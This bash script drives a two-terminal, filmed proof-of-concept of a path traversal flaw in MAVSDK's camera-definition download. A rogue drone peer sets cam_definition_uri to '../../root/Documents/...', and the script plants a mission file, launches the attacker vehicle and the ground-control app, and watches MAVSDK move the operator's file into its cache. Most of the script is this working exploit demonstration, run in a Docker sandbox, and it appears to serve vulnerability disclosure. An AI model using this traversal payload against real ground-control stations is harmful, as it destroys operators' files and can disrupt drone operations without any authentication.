#!/usr/bin/env bash
# MAVSDK-02 traversal demo -- built for filming with TWO terminals side by side.
#
#   TERMINAL A (right, the attacker vehicle):  ./demo.sh vehicle
#   TERMINAL B (left,  the operator):          ./demo.sh plant
#                                              ./demo.sh before
#                                              ./demo.sh run
#                                              ./demo.sh after
#
# What it shows: a MAVLink peer that only heartbeats names a path on the
# operator's disk in cam_definition_uri. MAVSDK renames that file out of
# existence into its own cache. No operator interaction, no authentication.
#
# The harness is shared with MAVSDK-03 (same field, same sink, different branch)
# and is mounted from that directory rather than duplicated.
set -euo pipefail
export DOCKER_CLI_HINTS=false
HERE="$(cd "$(dirname "$0")" && pwd)"
HARNESS="$HERE/../../MAVSDK-03_lzma_decompression_bomb/poc/poc_MAVSDK03_camera_definition_bomb.py"
NAME=mavsdk02demo
TTYF="-i"; [ -t 1 ] && TTYF="-it"
DEX="docker exec $TTYF $NAME bash -lc"

# The operator's file the drone will destroy. _tmp_download_path is
# /tmp/mavsdk-component-metadata-<random>, so '../..' lands on '/'.
VICTIM_DIR=/root/Documents
VICTIM_FILE=mission-2026-08-28.plan
VICTIM_PATH="$VICTIM_DIR/$VICTIM_FILE"
TRAVERSAL="../../root/Documents/$VICTIM_FILE"

case "${1:-help}" in

up)
  if ! docker image inspect mavsdk03-poc >/dev/null 2>&1; then
    echo "building the image (shipped libmavsdk-dev 3.17.4 .deb) ..."
    docker build -t mavsdk03-poc "$HERE" >/dev/null
  fi
  docker rm -f "$NAME" >/dev/null 2>&1 || true
  docker run -d --name "$NAME" -v "$HARNESS:/poc/poc.py:ro" \
    mavsdk03-poc sleep infinity >/dev/null
  echo "container '$NAME' is up (image mavsdk03-poc, MAVSDK v3.17.4)."
  ;;

# ---- TERMINAL B: set the scene ------------------------------------------
plant)
  $DEX "mkdir -p $VICTIM_DIR
        cat > $VICTIM_PATH <<'EOF'
QGC WPL 110
# Survey grid -- Kestrel Ridge, 2026-08-28
# Filed by the operator. Nothing in this file is attacker-supplied.
0	1	0	16	0	0	0	0	47.397742	8.545594	488.0	1
1	0	3	22	0.0	0.0	0.0	0.0	47.397742	8.545594	25.0	1
2	0	3	16	0.0	0.0	0.0	0.0	47.398180	8.546010	25.0	1
3	0	3	16	0.0	0.0	0.0	0.0	47.398600	8.545100	25.0	1
4	0	3	21	0.0	0.0	0.0	0.0	47.397742	8.545594	0.0	1
EOF
        echo 'planted:'; ls -l $VICTIM_PATH"
  ;;

before)
  $DEX "echo '---- the operator file, before ----'
        ls -l $VICTIM_PATH
        echo
        head -3 $VICTIM_PATH
        echo
        echo '---- MAVSDK cache ----'
        ls ~/.cache/mavsdk/camera/ 2>/dev/null | grep -v '^lock\$' || echo '  (empty)'"
  ;;

# ---- TERMINAL A: the attacker -------------------------------------------
vehicle)
  docker exec -i "$NAME" bash -lc 'for p in $(pgrep python3); do kill -9 $p; done' >/dev/null 2>&1 || true
  sleep 1
  echo "attacker vehicle: cam_definition_uri = mftp://$TRAVERSAL"
  echo "  (the FTP client will write the BASENAME into its temp dir --"
  echo "   camera_impl.cpp:1474 rebuilds the RAW path. That mismatch is the bug.)"
  echo
  $DEX "cd /work 2>/dev/null || mkdir -p /work && cd /work
        python3 /poc/poc.py --mode control --ftp-name '$TRAVERSAL' \
          --model MAVSDK02 --vendor infected-drones \
          --listen 0.0.0.0:5760 2>&1 | tee /work/trav.log"
  ;;

# ---- TERMINAL B: the beat -----------------------------------------------
run)
  $DEX "cd /work 2>/dev/null || mkdir -p /work && cd /work
        listening() { awk '\$4==\"0A\" && \$2 ~ /:1680\$/ {f=1} END{exit !f}' /proc/net/tcp; }
        ready() { grep -q 'waiting for the GCS' /work/trav.log 2>/dev/null; }
        if ! listening || ! ready; then
          echo 'ERROR: no attacker vehicle is ready on 5760.'
          echo '  In the OTHER terminal run:  ./demo.sh vehicle'
          exit 1
        fi
        rm -f /work/app.done /work/app.log
        echo '---- app starting (its whole body is: mavsdk::Camera{system}) ----'
        ( gcs_app tcpout://127.0.0.1:5760 25 > /work/app.log 2>&1 ; touch /work/app.done ) &
        LINGER=0
        while [ ! -f /work/app.done ]; do
          if [ -f $VICTIM_PATH ]; then
            V=\"PRESENT \$(stat -c%s $VICTIM_PATH) B\"
          else
            V='*** GONE ***  '
          fi
          C=\$(ls ~/.cache/mavsdk/camera/*.cache 2>/dev/null | head -1)
          if [ -n \"\$C\" ]; then CS=\"\$(stat -c%s \$C) B\"; else CS='empty'; fi
          if   grep -q 'Cached path'  /work/app.log 2>/dev/null; then PH='done';
          elif grep -q 'Download file' /work/app.log 2>/dev/null; then PH='transferring';
          else PH='idle'; fi
          printf '  %s  %s: %-18s cache: %-8s %s\n' \"\$(date +%T)\" '$VICTIM_FILE' \"\$V\" \"\$CS\" \"\$PH\"
          sleep 0.5
          # Hold four more frames after the deed so the result is readable, then
          # stop -- the app itself lingers in its connect timeout for 25s.
          if [ \"\$PH\" = done ]; then LINGER=\$((LINGER+1)); fi
          [ \$LINGER -ge 4 ] && break
        done
        echo
        echo '---- what MAVSDK logged ----'
        grep -E 'Download file|finished to|Cached path' /work/app.log | sed 's/^/  /'"
  ;;

after)
  $DEX "echo '---- the operator file, after ----'
        ls -l $VICTIM_PATH 2>/dev/null && echo '  (still present)' || echo '  *** $VICTIM_PATH IS GONE ***'
        echo
        echo '---- where its bytes went ----'
        ls -l ~/.cache/mavsdk/camera/ 2>/dev/null
        echo
        echo '---- content of the cache entry ----'
        head -3 ~/.cache/mavsdk/camera/*.cache 2>/dev/null
        echo
        echo '---- and what the attacker actually sent, harmlessly sandboxed ----'
        ls -l /tmp/mavsdk-component-metadata-*/ 2>/dev/null | grep -v '^total\|^d'"
  ;;

status)
  $DEX "echo -n 'vehicle listening on 5760: '
        awk '\$4==\"0A\" && \$2 ~ /:1680\$/ {f=1} END{print (f?\"YES\":\"no\")}' /proc/net/tcp
        echo -n 'vehicle ready (announced):  '
        grep -q 'waiting for the GCS' /work/trav.log 2>/dev/null && echo YES || echo no
        echo -n 'victim file present:        '
        [ -f $VICTIM_PATH ] && echo YES || echo 'no (run ./demo.sh plant)'
        echo -n 'camera cache:               '
        ls ~/.cache/mavsdk/camera/*.cache >/dev/null 2>&1 && echo 'NOT empty (run ./demo.sh reset)' || echo empty"
  ;;

reset)
  $DEX "rm -rf ~/.cache/mavsdk/camera /tmp/mavsdk-component-metadata-* /work/app.log /work/app.done
        echo 'cache and temp dirs cleared'"
  ;;

down) docker rm -f "$NAME" >/dev/null 2>&1 || true; echo "container removed." ;;

*)
  sed -n '2,14p' "$0" | sed 's/^# \{0,1\}//'
  ;;
esac
